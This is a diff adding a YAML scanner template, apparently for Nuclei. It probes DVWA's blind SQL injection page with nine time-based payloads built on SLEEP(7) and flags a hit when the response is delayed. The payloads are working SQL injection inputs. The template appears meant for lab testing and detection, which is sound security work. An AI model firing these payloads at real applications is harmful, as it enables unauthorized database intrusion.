@@ -1,0 +1,39 @@
+id: time-based-sqli-dvwa
+
+info:
+  name: DVWA Time-Based Blind SQL Injection
+  author: van
+  severity: critical
+  description: |
+    Phát hiện SQL Injection mù dạng time-based tại DVWA.
+  tags: dvwa,sqli,time-based,blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DVWA/vulnerabilities/sqli_blind/?id={{payload}}&Submit=Submit"
+
+    headers:
+      Cookie: "PHPSESSID=12g9sj6gdknke4870ld4boosib; security=medium"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+    payloads:
+      payload:
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(7),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+        - "1' AND SLEEP(7)--"
+        - "1' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "1' XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+
+    attack: pitchfork
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        name: time-delay
+        dsl:
+          - "duration >= 7 && duration <= 15"
